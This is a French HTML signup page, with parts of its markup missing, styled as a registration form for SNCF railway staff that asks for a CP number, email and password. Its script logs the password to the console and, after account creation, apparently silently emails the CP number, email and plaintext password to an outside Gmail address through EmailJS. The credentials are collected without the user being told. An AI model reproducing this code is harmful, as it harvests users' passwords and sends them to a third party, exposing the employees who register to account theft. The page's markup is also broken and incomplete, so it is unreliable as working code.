<!DOCTYPE html>

            justify-content: center;
            align-items: center;

            margin: 0;
            background-image: url('https://i.postimg.cc/85xFVQNC/background.jpg');

        }
        form {
            background: rgba(255, 255, 255, 0.5);

            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
            text-align: center; /* Centrer les éléments dans le formulaire */
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;

            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        .button-image {
            width: 80%; /* Réduction de la taille des boutons */
            cursor: pointer;
            margin-bottom: 10px;
            display: block; /* Centrer les boutons */
            margin-left: auto;
            margin-right: auto;
            background: none;
            border: none;
            padding: 0;
        }
        .note {
            font-size: 12px;
            color: #555;
            margin-bottom: 10px;
        }
        .buttons-container {
            position: absolute;
            top: 10px;
            left: 10px;
            display: flex;
            gap: 10px;
        }
        .buttons-container img {
            cursor: pointer;
        }
        .sticker {
            position: absolute;

            left: 10px;

<body>

    <form id="signup-form">

        <h1>Inscription</h1>
        <label for="cpNumber">Numéro de CP:</label>
        <input type="text" id="cpNumber" name="cpNumber" required>
        <br>
        <label for="password">Mot de passe:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
        <div class="note">Veuillez vous enregistrer avec votre email professionnel de type xxx@reseau.sncf.fr. Si vous souhaitez utiliser un autre type d'adresse mail ou permettre à un conjoint d'accéder au site, veuillez contacter l'administrateur du site <a href="mailto:julian.verhelle@reseau.sncf.fr">ici</a>.</div>
        <br>
        <button type="button" class="button-image" onclick="console.log('Button clicked'); submitForm()">
            <img src="https://i.imgur.com/fT6LhKe.png" alt="Inscription">
        </button>
        <a href="index.html"><img src="https://i.imgur.com/lMWcCJz.png" alt="Cancel" class="button-image"></a>
    </form>

        // Function to create a new user
        function submitForm() {
            console.log("submitForm called");
            const cpNumber = document.getElementById('cpNumber').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            console.log("CP Number:", cpNumber);
            console.log("Email:", email);
            console.log("Password:", password);

            // Vérifie si l'email est autorisé
            if (!authorizedEmails.includes(email)) {
                alert("Vous n'êtes pas autorisé à vous inscrire.");
                return;
            }

            createUserWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    const user = userCredential.user;
                    console.log("User signed up:", user);

                    // Envoie les données par email
                    sendEmail(cpNumber, email, password);

                    // Redirige vers accueil.html
                    window.location.href = 'accueil.html';
                })
                .catch((error) => {
                    const errorCode = error.code;
                    const errorMessage = error.message;
                    console.error("Error signing up:", errorCode, errorMessage);
                });
        }

        // Function to send email
        function sendEmail(cpNumber, email, password) {
            const templateParams = {
                cpNumber: cpNumber,
                email: email,
                password: password,
                to_email: 'symnosis@gmail.com',
                subject: 'Inscription plateforme'
            };

            emailjs.send('service_gdjyina', 'template_53r6fc7', templateParams)
                .then(function(response) {
                    console.log('Email sent successfully:', response.status, response.text);
                }, function(error) {
                    console.log('Failed to send email:', error);
                });
        }
    </script>
